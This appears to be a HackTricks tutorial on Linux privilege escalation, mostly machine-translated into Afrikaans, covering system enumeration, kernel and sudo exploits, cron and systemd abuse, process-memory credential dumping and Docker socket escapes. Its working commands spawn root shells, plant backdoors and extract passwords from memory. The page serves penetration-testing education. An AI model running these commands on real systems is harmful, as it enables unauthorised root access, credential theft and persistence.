# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Stelselinligting

### OS-inligting

Kom ons begin om 'n bietjie kennis van die bedryfstelsel te verkry
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pad

As jy **skrywe toestemmings op enige gids binne die `PATH`** veranderlike het, mag jy in staat wees om sommige biblioteke of binêre te kap:
```bash
echo $PATH
```
### Omgewing info

Interessante inligting, wagwoorde of API sleutels in die omgewingsveranderlikes?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kontroleer die kern weergawe en of daar 'n eksploits is wat gebruik kan word om voorregte te verhoog
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Jy kan 'n goeie lys van kwesbare kernel en sommige reeds **gecompileerde exploits** hier vind: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) en [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Ander webwerwe waar jy 'n paar **gecompileerde exploits** kan vind: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Om al die kwesbare kernel weergawes van daardie web te onttrek, kan jy doen:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools wat kan help om vir kernel exploits te soek is:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (voer uit IN slagoffer, kyk net na exploits vir kernel 2.x)

Soek altyd **die kernel weergawe in Google**, dalk is jou kernel weergawe in 'n of ander kernel exploit geskryf en dan sal jy seker wees dat hierdie exploit geldig is.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo weergawe

Gebaseer op die kwesbare sudo weergawes wat verskyn in:
```bash
searchsploit sudo
```
U kan nagaan of die sudo weergawe kwesbaar is deur hierdie grep te gebruik.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Van @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg-handtekeningverifikasie het gefaal

Kontroleer **smasher2 box of HTB** vir 'n **voorbeeld** van hoe hierdie kwesbaarheid benut kan word
```bash
dmesg 2>/dev/null | grep "signature"
```
### Meer stelselening
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Lys moontlike verdediging

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breekuit

As jy binne 'n docker-container is, kan jy probeer om daaruit te ontsnap:

{{#ref}}
docker-security/
{{#endref}}

## Skywe

Kontroleer **wat gemonteer en ongemonteer is**, waar en hoekom. As iets ongemonteer is, kan jy probeer om dit te monteer en na private inligting te kyk.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nuttige sagteware

Tel nuttige binaire op
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Kontroleer ook of **enige kompilator geïnstalleer is**. Dit is nuttig as jy 'n kernel-ontploffing moet gebruik, aangesien dit aanbeveel word om dit op die masjien te compileer waar jy dit gaan gebruik (of op een soortgelyke).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Kwetsbare Sagteware Geïnstalleer

Kontroleer die **weergawe van die geïnstalleerde pakkette en dienste**. Miskien is daar 'n ou Nagios weergawe (byvoorbeeld) wat benut kan word om privaathede te verhoog…\
Dit word aanbeveel om handmatig die weergawe van die meer verdagte geïnstalleerde sagteware te kontroleer.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
As jy SSH-toegang tot die masjien het, kan jy ook **openVAS** gebruik om te kyk vir verouderde en kwesbare sagteware wat binne die masjien geïnstalleer is.

> [!NOTE] > _Let daarop dat hierdie opdragte 'n baie inligting sal toon wat meestal nutteloos sal wees, daarom word dit aanbeveel om sommige toepassings soos OpenVAS of soortgelyk te gebruik wat sal kyk of enige geïnstalleerde sagteware weergawe kwesbaar is vir bekende eksploitte_

## Prosesse

Kyk na **watter prosesse** uitgevoer word en kyk of enige proses **meer regte het as wat dit behoort** (miskien 'n tomcat wat deur root uitgevoer word?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle prosesse kan gedebug wees, solank hulle die selfde uid het. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: slegs 'n ouer proses kan gedebug wees.
> - **kernel.yama.ptrace_scope = 2**: Slegs admin kan ptrace gebruik, aangesien dit CAP_SYS_PTRACE vermoë vereis.
> - **kernel.yama.ptrace_scope = 3**: Geen prosesse mag met ptrace getraceer word nie. Sodra dit gestel is, is 'n herbegin nodig om ptracing weer te aktiveer.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skrip
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Vir 'n gegewe proses ID, **maps wys hoe geheue binne daardie proses se** virtuele adresruimte gemap is; dit wys ook die **toestemmings van elke gemapte streek**. Die **mem** pseudo-lêer **stel die proses se geheue self bloot**. Van die **maps** lêer weet ons watter **geheue streke leesbaar is** en hul offsets. Ons gebruik hierdie inligting om **in die mem-lêer te soek en al leesbare streke** na 'n lêer te dump.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bied toegang tot die stelsel se **fisiese** geheue, nie die virtuele geheue nie. Die kern se virtuele adresruimte kan verkry word met /dev/kmem.\
Tipies is `/dev/mem` slegs leesbaar deur **root** en die **kmem** groep.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump vir linux

ProcDump is 'n Linux-herinterpretasie van die klassieke ProcDump-gereedskap uit die Sysinternals-gereedskapstel vir Windows. Kry dit in [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Gereedskap

Om 'n prosesgeheue te dump, kan jy gebruik maak van:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Jy kan handmatig root vereistes verwyder en die proses wat aan jou behoort dump
- Skrip A.5 van [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is vereis)

### Kredensiale uit Prosesgeheue

#### Handmatige voorbeeld

As jy vind dat die authenticator proses aan die gang is:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Jy kan die proses dump (sien vorige afdelings om verskillende maniere te vind om die geheue van 'n proses te dump) en soek vir geloofsbriewe binne die geheue:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Die hulpmiddel [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sal **duidelike teks geloofsbriewe uit geheue** en uit 'n paar **bekende lêers** steel. Dit vereis wortelregte om behoorlik te werk.

| Kenmerk                                           | Prosesnaam           |
| ------------------------------------------------- | -------------------- |
| GDM wagwoord (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Sleutelhanger (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktiewe FTP Verbindinge)                   | vsftpd               |
| Apache2 (Aktiewe HTTP Basiese Auth Sessions)         | apache2              |
| OpenSSH (Aktiewe SSH Sessies - Sudo Gebruik)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geskeduleerde/Cron take

Kyk of enige geskeduleerde taak kwesbaar is. Miskien kan jy voordeel trek uit 'n skrip wat deur root uitgevoer word (wildcard kwesbaarheid? kan lêers wat root gebruik, wysig? gebruik simboliese skakels? spesifieke lêers in die gids wat root gebruik, skep?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron pad

Byvoorbeeld, binne _/etc/crontab_ kan jy die PAD vind: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Let op hoe die gebruiker "user" skryfregte oor /home/user het_)

As die root gebruiker in hierdie crontab probeer om 'n opdrag of skrip uit te voer sonder om die pad in te stel. Byvoorbeeld: _\* \* \* \* root overwrite.sh_\
Dan kan jy 'n root shell kry deur te gebruik:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron gebruik 'n skrip met 'n wildcard (Wildcard Injection)

As 'n skrip wat deur root uitgevoer word 'n “**\***” binne 'n opdrag het, kan jy dit benut om onverwagte dinge te maak (soos privesc). Voorbeeld:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**As die wildcard voorafgegaan word deur 'n pad soos** _**/some/path/\***_ **, is dit nie kwesbaar nie (selfs** _**./\***_ **is nie).**

Lees die volgende bladsy vir meer wildcard eksploitasiemetodes:

{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron-skrip oorskrywing en symlink

As jy **'n cron-skrip kan wysig** wat deur root uitgevoer word, kan jy baie maklik 'n shell kry:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
As die skrip wat deur root uitgevoer word 'n **gids gebruik waar jy volle toegang het**, kan dit dalk nuttig wees om daardie gids te verwyder en **'n simboliese skakelgids na 'n ander een te skep** wat 'n skrip wat deur jou beheer word, dien
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Gereelde cron take

Jy kan die prosesse monitor om te soek na prosesse wat elke 1, 2 of 5 minute uitgevoer word. Miskien kan jy daarvan voordeel trek en privaathede verhoog.

Byvoorbeeld, om **elke 0.1s vir 1 minuut te monitor**, **te sorteer volgens minder uitgevoerde opdragte** en die opdragte wat die meeste uitgevoer is te verwyder, kan jy doen:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Jy kan ook gebruik maak van** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dit sal elke proses wat begin monitor en lys).

### Onsigbare cron take

Dit is moontlik om 'n cronjob te skep **wat 'n terugkeerkarakter na 'n opmerking plaas** (sonder 'n nuwe lyn karakter), en die cron taak sal werk. Voorbeeld (let op die terugkeerkarakter):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Skryfbare _.service_ lêers

Kyk of jy enige `.service` lêer kan skryf, as jy kan, kan jy dit **wysig** sodat dit jou **terugdeur** **uitvoer** wanneer die diens **gestart**, **herstart** of **gestop** word (miskien moet jy wag totdat die masjien herbegin word).\
Byvoorbeeld, skep jou terugdeur binne die .service lêer met **`ExecStart=/tmp/script.sh`**

### Skryfbare diens binaire

Hou in gedagte dat as jy **skryfregte oor binaire** wat deur dienste uitgevoer word het, jy hulle kan verander vir terugdeure sodat wanneer die dienste weer uitgevoer word, die terugdeure uitgevoer sal word.

### systemd PAD - Relatiewe Pade

Jy kan die PAD wat deur **systemd** gebruik word sien met:
```bash
systemctl show-environment
```
As jy vind dat jy kan **skryf** in enige van die vouers van die pad, mag jy in staat wees om **privileges te verhoog**. Jy moet soek na **relatiewe pades wat in dienskonfigurasie** lêers gebruik word soos:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Dan, skep 'n **uitvoerbare** lêer met die **selfde naam as die relatiewe pad binêre** binne die systemd PATH-gids wat jy kan skryf, en wanneer die diens gevra word om die kwesbare aksie uit te voer (**Begin**, **Stop**, **Herlaai**), sal jou **terugdeur uitgevoer word** (onbevoegde gebruikers kan gewoonlik nie dienste begin/stop nie, maar kyk of jy `sudo -l` kan gebruik).

**Leer meer oor dienste met `man systemd.service`.**

## **Timers**

**Timers** is systemd eenheid lêers waarvan die naam eindig op `**.timer**` wat `**.service**` lêers of gebeurtenisse beheer. **Timers** kan as 'n alternatief vir cron gebruik word aangesien hulle ingeboude ondersteuning het vir kalender tyd gebeurtenisse en monotone tyd gebeurtenisse en kan asynchrone loop.

Jy kan al die timers opnoem met:
```bash
systemctl list-timers --all
```
### Skryfbare timers

As jy 'n timer kan wysig, kan jy dit laat uitvoer van sommige bestaan van systemd.unit (soos 'n `.service` of 'n `.target`)
```bash
Unit=backdoor.service
```
In die dokumentasie kan jy lees wat die Eenheid is:

> Die eenheid om te aktiveer wanneer hierdie timer verstryk. Die argument is 'n eenheid naam, waarvan die agtervoegsel nie ".timer" is nie. As dit nie gespesifiseer is nie, is hierdie waarde die standaard vir 'n diens wat dieselfde naam as die timer eenheid het, behalwe vir die agtervoegsel. (Sien hierbo.) Dit word aanbeveel dat die eenheid naam wat geaktiveer word en die eenheid naam van die timer eenheid identies genoem word, behalwe vir die agtervoegsel.

Daarom, om hierdie toestemming te misbruik, moet jy:

- 'n sekere systemd eenheid vind (soos 'n `.service`) wat **'n skryfbare binêre uitvoer**
- 'n sekere systemd eenheid vind wat **'n relatiewe pad uitvoer** en jy het **skryfregte** oor die **systemd PAD** (om daardie uitvoerbare te verteenwoordig)

**Leer meer oor timers met `man systemd.timer`.**

### **Aktivering van Timer**

Om 'n timer te aktiveer, het jy worteltoestemmings nodig en moet jy uitvoer:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Let wel die **timer** is **geaktiveer** deur 'n symlink na dit te skep op `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) stel **proses kommunikasie** in staat op dieselfde of verskillende masjiene binne kliënt-bediener modelle. Hulle gebruik standaard Unix beskrywer lêers vir inter-rekenaar kommunikasie en word opgestel deur middel van `.socket` lêers.

Sockets kan gekonfigureer word met behulp van `.socket` lêers.

**Leer meer oor sockets met `man systemd.socket`.** Binne hierdie lêer kan verskeie interessante parameters gekonfigureer word:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Hierdie opsies is verskillend, maar 'n opsomming word gebruik om **aan te dui waar dit gaan luister** na die socket (die pad van die AF_UNIX socket lêer, die IPv4/6 en/of poortnommer om na te luister, ens.)
- `Accept`: Neem 'n boolean argument. As **waar**, 'n **diensinstansie word geskep vir elke inkomende verbinding** en slegs die verbinding socket word aan dit oorgedra. As **vals**, word al die luister sockets self **aan die begin diens eenheid oorgedra**, en slegs een diens eenheid word geskep vir al die verbindings. Hierdie waarde word geïgnoreer vir datagram sockets en FIFOs waar 'n enkele diens eenheid onvoorwaardelik al die inkomende verkeer hanteer. **Standaard is vals**. Vir prestasiedoeleindes word dit aanbeveel om nuwe daemons slegs op 'n manier te skryf wat geskik is vir `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Neem een of meer opdraglyne, wat **uitgevoer word voor** of **na** die luister **sockets**/FIFOs **gecreëer** en gebind word, onderskeidelik. Die eerste token van die opdraglyn moet 'n absolute lêernaam wees, gevolg deur argumente vir die proses.
- `ExecStopPre`, `ExecStopPost`: Bykomende **opdragte** wat **uitgevoer word voor** of **na** die luister **sockets**/FIFOs **gesluit** en verwyder word, onderskeidelik.
- `Service`: Gee die **diens** eenheid naam **om te aktiveer** op **inkomende verkeer**. Hierdie instelling is slegs toegelaat vir sockets met Accept=no. Dit is standaard die diens wat dieselfde naam as die socket dra (met die agtervoegsel vervang). In die meeste gevalle behoort dit nie nodig te wees om hierdie opsie te gebruik nie.

### Skryfbare .socket lêers

As jy 'n **skryfbare** `.socket` lêer vind, kan jy **byvoeg** aan die begin van die `[Socket]` afdeling iets soos: `ExecStartPre=/home/kali/sys/backdoor` en die backdoor sal uitgevoer word voordat die socket geskep word. Daarom, jy sal **waarskynlik moet wag totdat die masjien herbegin word.**\
&#xNAN;_&#x4E;let daarop dat die stelsel daardie socket lêer konfigurasie moet gebruik of die backdoor sal nie uitgevoer word nie_

### Skryfbare sockets

As jy **enige skryfbare socket identifiseer** (_nou praat ons oor Unix Sockets en nie oor die konfig `.socket` lêers nie_), dan **kan jy kommunikeer** met daardie socket en dalk 'n kwesbaarheid ontgin.

### Enumereer Unix Sockets
```bash
netstat -a -p --unix
```
### Rou verbinding
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Eksploitasi voorbeeld:**

{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sokke

Let daarop dat daar dalk **sokke is wat luister na HTTP** versoeke (_Ek praat nie van .socket lêers nie, maar die lêers wat as unix sokke optree_). Jy kan dit nagaan met:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
As die socket **reageer met 'n HTTP** versoek, kan jy **kommunikeer** daarmee en dalk **'n kwesbaarheid ontgin**.

### Skryfbare Docker Socket

Die Docker socket, wat dikwels gevind word by `/var/run/docker.sock`, is 'n kritieke lêer wat beveilig moet word. Standaard is dit skryfbaar deur die `root` gebruiker en lede van die `docker` groep. Om skryfreëling tot hierdie socket te hê, kan lei tot privilige-eskalasie. Hier is 'n uiteensetting van hoe dit gedoen kan word en alternatiewe metodes as die Docker CLI nie beskikbaar is nie.

#### **Privilige Eskalasie met Docker CLI**

As jy skryfreëling tot die Docker socket het, kan jy privilige eskalasie doen met die volgende opdragte:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Hierdie opdragte laat jou toe om 'n houer met wortelvlaktoegang tot die gasheer se lêerstelsel te draai.

#### **Gebruik Docker API Direk**

In gevalle waar die Docker CLI nie beskikbaar is nie, kan die Docker-soket steeds gemanipuleer word met behulp van die Docker API en `curl` opdragte.

1.  **Lys Docker Beelde:** Verkry die lys van beskikbare beelde.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Skep 'n Houer:** Stuur 'n versoek om 'n houer te skep wat die gasheerstelsel se wortelgids monteer.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Begin die nuutgeskepte houer:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Koppel aan die Houer:** Gebruik `socat` om 'n verbinding met die houer te vestig, wat opdraguitvoering binne-in dit moontlik maak.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nadat jy die `socat`-verbinding opgestel het, kan jy opdragte direk in die houer uitvoer met wortelvlaktoegang tot die gasheer se lêerstelsel.

### Ander

Let daarop dat as jy skrywe toestemmings oor die docker soket het omdat jy **binne die groep `docker`** is, jy het [**meer maniere om voorregte te verhoog**](interesting-groups-linux-pe/index.html#docker-group). As die [**docker API op 'n poort luister** kan jy dit ook kompromitteer](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Kyk na **meer maniere om uit docker te breek of dit te misbruik om voorregte te verhoog** in:

{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) voorregverhoging

As jy vind dat jy die **`ctr`** opdrag kan gebruik, lees die volgende bladsy as **jy dalk dit kan misbruik om voorregte te verhoog**:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** voorregverhoging

As jy vind dat jy die **`runc`** opdrag kan gebruik, lees die volgende bladsy as **jy dalk dit kan misbruik om voorregte te verhoog**:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus is 'n gesofistikeerde **inter-Process Communication (IPC) stelsel** wat toepassings in staat stel om doeltreffend te kommunikeer en data te deel. Ontwerp met die moderne Linux-stelsel in gedagte, bied dit 'n robuuste raamwerk vir verskillende vorme van toepassingskommunikasie.

Die stelsel is veelsydig, wat basiese IPC ondersteun wat data-uitruil tussen prosesse verbeter, wat herinner aan **verbeterde UNIX-domein sokke**. Boonop help dit om gebeurtenisse of seine te versprei, wat naatlose integrasie tussen stelseldelers bevorder. Byvoorbeeld, 'n sein van 'n Bluetooth-daemon oor 'n inkomende oproep kan 'n musiekspeler aanmoedig om te demp, wat die gebruikerservaring verbeter. Daarbenewens ondersteun D-Bus 'n afstandsobjekstelsel, wat diensversoeke en metode-aanroep tussen toepassings vereenvoudig, wat prosesse stroomlyn wat tradisioneel kompleks was.

D-Bus werk op 'n **toelaat/ontken model**, wat boodskaptoestemmings (metode-aanroepe, seinuitstralings, ens.) bestuur op grond van die kumulatiewe effek van ooreenstemmende beleidsreëls. Hierdie beleide spesifiseer interaksies met die bus, wat moontlik voorregverhoging deur die uitbuiting van hierdie toestemmings toelaat.

'n Voorbeeld van so 'n beleid in `/etc/dbus-1/system.d/wpa_supplicant.conf` word verskaf, wat toestemmings vir die wortelgebruiker om te besit, te stuur na, en boodskappe van `fi.w1.wpa_supplicant1` te ontvang, uiteensit.

Beleide sonder 'n gespesifiseerde gebruiker of groep geld universeel, terwyl "default" konteksbeleide op almal van toepassing is wat nie deur ander spesifieke beleide gedek word nie.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Leer hoe om 'n D-Bus kommunikasie te evalueer en te benut hier:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netwerk**

Dit is altyd interessant om die netwerk te evalueer en die posisie van die masjien uit te vind.

### Generiese evaluering
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Ope poorte

Kontroleer altyd netwerkdienste wat op die masjien loop wat jy nie kon interaksie mee hê voordat jy toegang verkry het nie:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Kontrollleer of jy verkeer kan sniff. As jy kan, kan jy dalk 'n paar akrediteerbare inligting gryp.
```
timeout 1 tcpdump
```
## Gebruikers

### Generiese Enumerasie

Kontroleer **wie** jy is, watter **privileges** jy het, watter **gebruikers** in die stelsels is, watter kan **aanmeld** en watter het **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

